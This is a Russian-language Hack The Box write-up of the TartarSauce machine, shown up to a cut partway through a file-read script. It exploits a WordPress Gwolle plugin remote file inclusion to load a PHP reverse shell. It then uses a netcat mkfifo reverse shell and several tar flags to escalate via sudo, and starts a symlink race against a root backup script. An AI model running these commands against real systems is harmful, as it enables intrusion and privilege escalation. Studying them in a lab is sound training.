---
layout: post
title: "HTB: TartarSauce Write-Up"
date: 2018-11-02 00:00:00 +0300
author: snovvcrash
categories: ctf write-ups boxes hackthebox
tags: [ctf, write-ups, boxes, hackthebox, TartarSauce, linux, cms, monstra, wordpress, wpscan, rfi, tar, code-analysis, bash]
comments: true
published: true
---

**TartarSauce** — весьма нетривиальная Linux-тачка, которая не прочь тебя подурачить. Преодолев огромное количество rabbit-hole'ов, мы столкнемся с: *RFI*-уязвимостью в устаревшем плагине для *WordPress* (входная точка в систему) и эксплуатацией некоторых особенностей поведения утилиты *tar* для обоих PrivEsc'ов. Для повышения привилегий до пользователя будем абьюзить флаги *--to-command* / *--use-compress-program* / *--checkpoint-action*; для инициализации же сессии суперпользователя придется разреверсить bash-скрипт и, воспользовавшись тем фактом, что tar "помнит" владельцев упакованных файлов, скрафтить и запустить SUID-шелл. Также возможен более лайтовый вариант прочтения root-флага, не требующий получения полноценного шелла: здесь будут продемонстрированы некоторые фишки утилиты *diff*. Это будет длинный райтап... **Сложность: 6.2/10**{:style="color:grey;"}

<!--cut-->

[![tartarsauce-banner.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/138 "Hack The Box :: TartarSauce")

<h4 style="color:red;margin-bottom:0;">TartarSauce: 10.10.10.88</h4>
<h4 style="color:red;">Kali: 10.10.14.14</h4>

* TOC
{:toc}

# Nmap
Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.88
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Mon Oct 29 09:44:01 2018 as: nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.88
Nmap scan report for 10.10.10.88
Host is up, received user-set (0.064s latency).
Scanned at 2018-10-29 09:44:01 EDT for 1s
Not shown: 999 closed ports
Reason: 999 resets
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Oct 29 09:44:02 2018 -- 1 IP address (1 host up) scanned in 0.52 seconds
```

Version ([красивый отчет]({{ "/nmap/htb-tartarsauce-nmap-version.html" | relative_url }})):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/misc/nmap-bootstrap.xsl -p80 10.10.10.88
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Mon Oct 29 09:44:27 2018 as: nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/misc/nmap-bootstrap.xsl -p80 10.10.10.88
Nmap scan report for 10.10.10.88
Host is up, received echo-reply ttl 63 (0.062s latency).
Scanned at 2018-10-29 09:44:27 EDT for 8s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 29 09:44:35 2018 -- 1 IP address (1 host up) scanned in 8.38 seconds
```

Всего один открытый порт — 80-й, веб. С него и начнем. Обращаю внимание на найденный `robots.txt`.

# Web — Порт 80
## Браузер
На `http://10.10.10.88:80` нас поджидает немного ASCII-арта:

[![tartarsauce-port80-browser-1.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-1.png" | relative_url }})

В исходниках ничего интересного кроме последней строчки после кучи whitespace'ов:
```html
...
<!--Carry on, nothing to see here :D-->
```

Посмотрим `/robots.txt`:
```text
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

Все ссылки возвращают **404** кроме `http://10.10.10.88/webservices/monstra-3.0.4/`, за которой скрывается:

[![tartarsauce-port80-browser-2.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-2.png" | relative_url }})

Monstra CMS. Нам даже разрешают залогиниться со стандартными кредами `admin:admin` и прогуляться по админке:

[![tartarsauce-port80-browser-3.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-3.png" | relative_url }})

[![tartarsauce-port80-browser-4.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-4.png" | relative_url }})

Чтобы не разводить много лирики, сразу скажу, что это одна большая "кроличья нора": из админки нельзя сделать ровным счетом ни-че-го, редактирование кода / загрузка сущностей не проходит — очень похоже, что вся CMS находится в "[read-only режиме]({{ page.url }}#доступ-к-monstra-cms)".

## gobuster
Поищем субдиректории в `/webservices`:
```text
root@kali:~# gobuster -u 'http://10.10.10.88/webservices' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -o gobuster/tartarsauce.gobuster

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.88/webservices/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2018/10/29 09:49:31 Starting gobuster
=====================================================
http://10.10.10.88/webservices/wp (Status: 301)
^C
```

Итак, у нас есть WordPress:

[![tartarsauce-port80-browser-5.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-5.png" | relative_url }})]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-5.png" | relative_url }})

Если в CTF-виртуалке развернут WordPress, то в большинстве случаев "из коробки" он будет сломан, т. к. использует доменные имена в ссылках. Чинится это добавлением соответствующих записей в `/etc/hosts`, но это не наш случай.

Если взглянуть на сорцы, то можно увидеть ссылки вида `http:/10.10.10.88...` (один слеш). Пофиксим это в Burp'е:

[![tartarsauce-burp-settings-1.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-burp-settings-1.png" | relative_url }})]({{ "/img/htb/boxes/tartarsauce/tartarsauce-burp-settings-1.png" | relative_url }})

[![tartarsauce-burp-settings-2.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-burp-settings-2.png" | relative_url }})]({{ "/img/htb/boxes/tartarsauce/tartarsauce-burp-settings-2.png" | relative_url }})

Теперь все как нужно:

[![tartarsauce-port80-browser-6.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-6.png" | relative_url }})]({{ "/img/htb/boxes/tartarsauce/tartarsauce-port80-browser-6.png" | relative_url }})

Но это так, к слову, потому что больше на этой страничке ничего интересного не живет.

## wpscan
Обратимся за помощью к WPScan'у, чтобы найти потенциальные уязвимости в плагинах:
```text
root@kali:~# wpscan -u 'http://10.10.10.88/webservices/wp' -u ap --log wpscan/tartarsauce.wpscan
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________
...
[+] We found 3 plugins:

[+] Name: akismet - v4.0.3
 |  Last updated: 2018-06-19T18:18:00.000Z
 |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
[!] The version is out of date, the latest version is 4.0.8

[+] Name: brute-force-login-protection - v1.5.3
 |  Latest version: 1.5.3 (up to date)
 |  Last updated: 2017-06-29T10:39:00.000Z
 |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
 |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] Name: gwolle-gb - v2.3.10
 |  Last updated: 2018-09-23T14:06:00.000Z
 |  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 |  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
[!] The version is out of date, the latest version is 2.6.5
...
```

Ничего криминального нет, однако, просматривая `readme.txt` устаревших плагинов, я наткнулся на такое прелестное послание:
```text
root@kali:~# curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | grep 2.3.10
Stable tag: 2.3.10
= 2.3.10 =
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
```

Ах, подло :angry:

Отсюда вывод, что, скорее всего, то, что нам нужно — устаревший плагин `gwolle-gb` (v1.5.3).

Посмотрим, что нам скажет Exploit-DB:
```text
root@kali:~# searchsploit gwolle
------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                    |  Path
                                                                  | (/usr/share/exploitdb/)
------------------------------------------------------------------ ----------------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion   | exploits/php/webapps/38861.txt
------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

```text
root@kali:~# seachsploit -x exploits/php/webapps/38861.txt
  Exploit: WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/38861/
     Path: /usr/share/exploitdb/exploits/php/webapps/38861.txt

...
HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote Kali can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the Kali needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:

http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
...
```

И в лицо нам тычут RFI (***R**emote **F**ile **I**nclusion*) дырой, зияющей в этой версии плагина. Что ж, давайте проверять.

# Захват LowPriv юзера (www-data)
В этом параграфе будет эксплуатировать [CVE-2015-8351](https://www.exploit-db.com/exploits/38861 "WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion") для получения "низкопривилегированного" (as www-data) шелла. Начнем по традиции с демонстрации осуществимости атаки.

## Gwolle RFI Proof-of-Concept
Внимая описанию уязвимости, постучимся по адресу `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.14:31337/`, слушая при этом 31337-й порт:
```text
root@kali:~# curl -s 'http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.14:31337/'

```

```text
root@kali:~# nc -nlvvp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from 10.10.10.88.
Ncat: Connection from 10.10.10.88:41948.
GET /wp-load.php HTTP/1.0
Host: 10.10.14.14:31337
Connection: close
```

Есть контакт! Переходим к захвату шелла.

## Gwolle RFI Shell (внутри машины)
Для инициализации сессии будем пользоваться [php-реверс-шеллом](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/laudanum-0.8/php/php-reverse-shell.php "SecLists/php-reverse-shell.php at master · danielmiessler/SecLists") от SecLists.

Дадим скрипту имя, которое ожидает от нас WordPress-плагин, сконфигурируем нужные нам IP и порт (поставлю 443-й, чтобы лишний раз не беспокоить гипотетический файрвол) и поднимем http-сервер, чтобы жертва смогла забрать приготовленный для нее вредонос:
```text
root@kali:~/www# ls
php-reverse-shell.php

root@kali:~/www# mv php-reverse-shell.php wp-load.php
root@kali:~/www# vim wp-load.php

root@kali:~/www# python3 -m http.server 31337
Serving HTTP on 0.0.0.0 port 31337 (http://0.0.0.0:31337/) ...
10.10.10.88 - - [29/Oct/2018 17:10:14] "GET /wp-load.php HTTP/1.0" 200 -

```

Ударим в curl:
```text
root@kali:~# curl -s 'http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.14:31337/'

```

И получим честно заработанный шелл:
```text
root@kali:~# nc -nlvvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.88.
Ncat: Connection from 10.10.10.88:39518.

Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 i686 i686 GNU/Linux
 17:10:15 up  7:13,  0 users,  load average: 0.01, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data

$ uname -a
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 i686 i686 GNU/Linux
```

В красках все выглядело ни много ни мало следующим образом (красным — порядок активности панелей):

[![tartarsauce-www-data-shell.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-www-data-shell.png" | relative_url }})]({{ "/img/htb/boxes/tartarsauce/tartarsauce-www-data-shell.png" | relative_url }})

# PrivEsc: www-data → onuma
Оказавшись внутри машины, я дернул [LinEnum.sh](https://github.com/rebootuser/LinEnum "rebootuser/LinEnum: Scripted Local Linux Enumeration & Privilege Escalation Checks"), чтобы немного облегчить себе жизнь с процедурой энумерации машины. В числе прочего, вот, что он сказал:
```text
www-data@TartarSauce:/dev/shm$ bash LinEnum.sh
...
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar


[+] Possible sudo pwnage!
/bin/tar
...
```

```text
www-data@TartarSauce:/dev/shm$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

`tar` (обращаем внимание на название виртуалки, ага) доступен для выполнения из-под юзера *onuma* без пароля, поэтому можно считать, что этот пользователь уже у нас в кармане. Есть не один путь повышения привилегий с помощью этой утилиты, [GTFOBins](https://gtfobins.github.io/gtfobins/tar "tar / GTFOBins") это подтвердит. Рассмотрим 3 способа, как это можно сделать.

## tar --to-command
Флаг `--to-command` позволяет отправить распакованный файл на выполнения указанному процессу, поэтому план таков:
  1. Создать bash-нагрузку с реверс-шеллом до своей машины.
  2. Запаковать ее в `.tar`.
  3. Распаковать ее tar'ом, и передать на исполнения bash-интерпретатору с помощью `--to-command /bin/bash`.
  4. Поймать шелл у себя на netcat.

```text
www-data@TartarSauce:/dev/shm$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f' > .sh3ll.sh
www-data@TartarSauce:/dev/shm$ tar -cvf .sh3ll.tar .sh3ll.sh
.sh3ll.sh

www-data@TartarSauce:/dev/shm$ sudo -u onuma /bin/tar -xvf .sh3ll.tar --to-command /bin/bash
.sh3ll.sh
rm: cannot remove '/tmp/f': No such file or directory

```

```text
root@kali:~# nc -nlvvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.88.
Ncat: Connection from 10.10.10.88:51608.

$ whoami
onuma

$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```

### user.txt
```text
$ cat /home/onuma/user.txt
b2d6ec45????????????????????????
```

## tar --use-compress-program
Флагом `--use-compress-program` (или `-I`) можно явно задать другую программу для сжатия данных, если пользователь не удовлетворен тем, что ему предлагает по умолчанию tar.

Мы же злостно проэксплуатируем эту опцию, подсунув tar'у вместо утилиты для архивирования обычный `/bin/sh` с волшебными редиректами для входных и выходных данных, что дарует нам пользовательский шелл:
```text
www-data@TartarSauce:/dev/shm$ sudo -u onuma /bin/tar -xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
$ whoami
onuma

$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```

```text
$ cat /home/onuma/user.txt
b2d6ec45????????????????????????
```

## tar --checkpoint-action
Флаг `--checkpoint=NUM` позволяет выполнять действие после каждых обработанных `NUM` байт. Действие по умолчанию — вывод сообщения о прогрессе, **но** действие можно изменять опцией `--checkpoint-action` :smiling_imp:

Дальше все очевидно: попросим tar отдать нам шелл после процессинга 1-го байта *пустоты ~~и безысходности~~*:
```text
www-data@TartarSauce:/var/www$ sudo -u onuma /bin/tar -Pcf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
$ whoami
onuma

$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```

```text
$ cat /home/onuma/user.txt
b2d6ec45????????????????????????
```

Интересный хак: если бы мы не могли самостоятельно сконструировать команду для tar (в случае, если бы он запускался по cron-задаче, например) **и** пользователь имел неосторожность поставить asterisks (\*) в целевой директории для архивирования (к примеру, так: `tar -zcf /var/backups/home.tgz /home/*`), то мы все равно могли бы провести эксплуатацию, создав файлы с названиями, идентичными названию нужных флагов и их значений. Такие файлы были бы обработаны tar'ом как аргументы командной строки. Подробнее об этом можно почитать [здесь](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744 "Attack and Defend: Linux Privilege Escalation Techniques of 2016 - attack-defend-linux-privilege-escalation-techniques-2016-152744") (*начало на стр. 8, Figure 4 – Example Cron Job*).

# PrivEsc: onuma → root
Выберем один из способов выше для PWN'а пользователя *onuma*, заспауним красивый шелл от его имени и пойдем дальше.

В домашней директории ничего привлекательного:
```text
onuma@TartarSauce:~$ ls -la
total 40
drwxrw---- 5 onuma onuma 4096 Feb 21  2018 .
drwxr-xr-x 3 root  root  4096 Feb  9  2018 ..
lrwxrwxrwx 1 root  root     9 Feb 17  2018 .bash_history -> /dev/null
-rwxrw---- 1 onuma onuma  220 Feb  9  2018 .bash_logout
-rwxrw---- 1 onuma onuma 3871 Feb 15  2018 .bashrc
drwxrw---- 2 onuma onuma 4096 Feb  9  2018 .cache
-rwxrw---- 1 onuma onuma   52 Feb 17  2018 .mysql_history
drwxrw---- 2 onuma onuma 4096 Feb 17  2018 .nano
-rwxrw---- 1 onuma onuma  655 Feb  9  2018 .profile
drwxrw---- 2 onuma onuma 4096 Feb 15  2018 .ssh
-rwxrw---- 1 onuma onuma    0 Feb  9  2018 .sudo_as_admin_successful
lrwxrwxrwx 1 root  root     9 Feb 17  2018 shadow_bkp -> /dev/null
-r-------- 1 onuma onuma   33 Feb  9  2018 user.txt
```

Повторим запуск LinEnum'а от *onuma* (стихи :grimacing:). На этот раз интересная инфа оказалась в разделе таймеров systemd:
```text
onuma@TartarSauce:~$ bash /dev/shm/LinEnum.sh
...
[-] Systemd timers:
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Wed 2018-10-31 13:31:38 EDT  10s left      Wed 2018-10-31 13:26:38 EDT  4min 49s ago backuperer.timer             backuperer.service
Wed 2018-10-31 13:36:22 EDT  4min 54s left n/a                          n/a          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Thu 2018-11-01 01:58:12 EDT  12h left      Wed 2018-10-31 13:21:28 EDT  9min ago     apt-daily.timer              apt-daily.service
Thu 2018-11-01 06:14:34 EDT  16h left      Wed 2018-10-31 13:21:28 EDT  9min ago     apt-daily-upgrade.timer      apt-daily-upgrade.service

4 timers listed.
...
```

## backuperer
Видим нестандартный сервис `backuperer`, активирующийся каждые 5 минут. Узнаем подробнее, что это за сервис такой:
```text
onuma@TartarSauce:~$ locate backuperer
/etc/systemd/system/multi-user.target.wants/backuperer.timer
/lib/systemd/system/backuperer.service
/lib/systemd/system/backuperer.timer
/usr/sbin/backuperer
```

```text
onuma@TartarSauce:~$ cat /etc/systemd/system/multi-user.target.wants/backuperer.timer
[Unit]
Description=Runs backuperer every 5 mins

[Timer]
# Time to wait after booting before we run first time
OnBootSec=5min
# Time between running each consecutive time
OnUnitActiveSec=5min
Unit=backuperer.service

[Install]
WantedBy=multi-user.target
```

### Анализ backuperer
```text
onuma@TartarSauce:~$ cat /usr/sbin/backuperer
```

```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Bash-скрипт для бэкапа директории с вебом. Будем разбираться, что здесь происходит:

1\. Определение переменных:
```bash
# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check
```

Обращаем внимание на то, что за `tmpfile` скрывается имя вида `/var/tmp/.<SHA1_DIGEST>`, где `<SHA1_DIGEST>` это хеш-значение SHA1 (40 символов).

2\. Определение функции печати красивых сообщений для логов, и создание тестового сообщения `/var/backups/onuma_backup_test.txt`:
```bash
# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg
```

Ничего интересного.

3\. Удаление предыдущего бэкапа (`/var/tmp/.*` и `/var/tmp/check` — последний результат работы этого скрипта):
```bash
# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check
```

4\. Собственно, бэкап — использование утилиты tar для создания *.tar.gz* архива директории `/var/www/html`:
```bash
# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30
```

Полный путь до получившегося архива: `/var/tmp/.<SHA1_DIGEST>`. После запуска команды создания архива уходим в сон на 30 секунд (запомнили это).

5\. Определение функции проверки целостности бэкапа:
```bash
# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}
```

Рекурсивно используется обычный diff применительно к двум директориям: рабочая — `/var/www/html` и распакованный (см. шаг 6) бэкап — `/var/tmp/check/var/www/html`.

6\. Создание директории `/var/tmp/check` и распаковка туда только что созданного бэкапа `/var/tmp/.<SHA1_DIGEST>`:
```bash
/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
```

Делается сие для последующей проверки целостности (см. шаг 7). Временная директория, куда все разархивировалось — `/var/tmp/check/var/www/html` (= `/var/tmp/check/` + `var/www/html`, т. к. tar по умолчанию при распаковке благоразумно режет ведущие слеши у путей; отключается такое поведение, кстати, флагом `--absolute-names` или `-P`).

7\. Проверка целостности полученного бэкапа:
```bash
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Здесь остановимся подробнее.

Если функция проверки целостности вернула "Истину" (проверка не пройдена), то:
  1. Пишем злостное сообщение в лог ошибок `/var/backups/onuma_backup_error.txt`.
  2. Пишем, что именно пошло не так (в этот же лог).
  3. Выходим с кодом 2.

Если функция проверки целостности вернула "Ложь" (проверка пройдена), то:
  1. Перемещаем архив `/var/tmp/.<SHA1_DIGEST>` по пути `/var/backups/onuma-www-dev.bak`.
  2. Удаляем `/var/tmp/check` и `/var/tmp/.*`.
  3. Выходим с кодом 0.

Интереснее всего здесь то, при каких же условиях выражение `[[ $(integrity_chk) ]]` окажется "Истиной"? Есть 3 варианта развития событий:
  1. Содержимое директорий идентично — тогда `$(integrity_chk)` есть `0` и *if* пойдет по ветке "Ложь", проверка целостности пройдена.
  2. Содержимое директорий различается — тогда `$(integrity_chk)` есть `1` и *if* пойдет по ветке "Истина", проверка целостности не пройдена.
  3. Произошла ошибка (например, diff'у передан несуществующий файл/директория) — тогда `$(integrity_chk)` есть `2` и *if* пойдет по ветке "Ложь", проверка целостности пройдена. Забавный факт: по логике, если `$(integrity_chk)` — это `2`, то ветвление должно уйти в "Истину", т. к. `2` != `0` (логика!), однако здесь все немного по-другому. Рассмотрим два одинаковых на первый взгляд кусочка кода: `if [[ $(integrity_chk) ]] ...` и `$(integrity_chk); if [[ $? ]] ...`. Допустим, что `integrity_chk` возвращает `2`, тогда в случае первого примера условие вернет "Ложь", а в случае второго — "Истину", хотя по факту и первый и второй листинг в конечном счете будут содержать *if* вида `if [[ 2 ]] ...`. Здесь мы сталкиваемся с "услужливостью" bash'а, который заботливо полагает, что в случае, если любой результат, *отличный от единицы*, вернулся прямиком из функции (`$(integrity_chk)`), то он всегда будет ложным. А если мы напрямую спросим у bash'а, что он думает о выражении `[[ 2 ]] ...` (как в случае с `$(integrity_chk); if [[ $? ]] ...`), тогда будет работать привычная логика погромистов, и условие `if [[ 2 ]] ...` окажется истинным.

#### Табличка
Исходя из выкладок выше справедлива такая табличка:

|--------------------+--------------+-----------------------------+---------------+-----------------------|
| Файлы на вход diff | Код возврата | `if [[ $(integrity_chk) ]]` | `if [[ $? ]]` | Целостность пройдена? |
|:-------------------|:-------------|:----------------------------|:--------------|:----------------------|
| Идентичны          | 0            | Ложь                        | Ложь          | Да                    |
| Различаются        | 1            | Истина                      | Истина        | Нет                   |
| Ошибка             | 2            | Ложь                        | Истина        | Нет                   |
|--------------------+--------------+-----------------------------+---------------+-----------------------|

Рассмотрим 2 возможных сценария получения root-флага.

### Эксплуатация backuperer: diff
Первый способ напрашивается сам собой: задействуем особенность стандартного поведения утилиты diff, которая заключается в выводе на экран различий между содержимым двух директорий (если различия есть, разумеется).

План действий следующий:
  1. Ждем появления промежуточного архива `/var/tmp/.<SHA1_DIGEST>`. У нас будет 30 секунд на остальные шаги.
  2. Распаковываем содержимое.
  3. Подменяем любой из файлов на символическую ссылку на файл, который хотим прочитать (в нашем случае заменим `var/www/html/robots.txt` на `/root/root.txt`).
  4. Запаковываем все обратно.
  5. Ждем, когда backuperer выполнит проверку целостности, она провалится (и выполнение *if*'а пойдет по ветке "Ложно"), и читаем лог ошибок `/var/backups/onuma_backup_error.txt`. Там нас будет ждать содержимое нужного файла.

Конечно, это можно легко успеть сделать вручную, однако скрипт написать всегда приятнее, поэтому немного bash-кода:
```bash
#!/usr/bin/env bash

# Usage: bash .tartarsauce_file_read.sh

wd='/dev/shm'
robotstxt='/var/www/html/robots.txt'
roottxt='/root/root.txt'
errlog='/var/backups/onuma_backup_error.txt'

# Ищем путь бэкапа (с помощью регулярки для SHA1) и инициализируем им start и curr
start=$(find /var/tmp -maxdepth 1 -type f -regextype sed -regex '.*/.[a-f0-9]\{40\}')
curr=$(find /var/tmp -maxdepth 1 -type f -regextype sed -regex '.*/.[a-f0-9]\{40\}')

# Ловим момент, когда создается архив бэкапа
echo '[*] Waiting for archive filename to change...'
